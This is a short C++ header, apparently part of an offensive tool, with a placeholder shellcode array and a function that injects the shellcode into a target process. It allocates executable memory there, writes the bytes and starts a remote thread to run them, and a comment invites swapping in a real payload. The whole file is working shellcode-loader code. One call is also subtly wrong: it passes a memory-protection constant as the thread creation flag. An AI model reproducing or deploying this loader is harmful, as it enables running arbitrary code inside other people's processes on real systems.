#pragma once
#include <Windows.h>
#include <psapi.h>
#include "Ridgway.h"

// Change the shellcode here
unsigned char shellcode[] =
{
  0x41, 0x41, 0x41, 0x41
};

BOOL InjectShellcodeIntoNewThread(PROCESS_INFORMATION processInfo)
{
	DebugPrint(TEXT("[*] Allocating memory in target process\n"));
	const PVOID memoryAddress = VirtualAllocEx(processInfo.hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!memoryAddress)
	{
		DisplayErrorMessage(TEXT("Error calling VirtualAlloc"), GetLastError());
		return FALSE;
	}
	
	DebugPrint(TEXT("[*] Writing shellcode into memory\n"));
	if (!WriteProcessMemory(processInfo.hProcess, memoryAddress, shellcode, sizeof(shellcode), nullptr))
	{
		DisplayErrorMessage(TEXT("Error writing process memory"), GetLastError());
		return FALSE;
	}
	
	DebugPrint(TEXT("[*] Creating thread to run shellcode\n"));
	if (!CreateRemoteThread(processInfo.hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)memoryAddress, nullptr, PAGE_EXECUTE_READWRITE, nullptr))
	{
		DisplayErrorMessage(TEXT("Error creating thread"), GetLastError());
		return FALSE;
	}
	DebugPrint(TEXT("[+] Thread created\n"));
	return TRUE;
}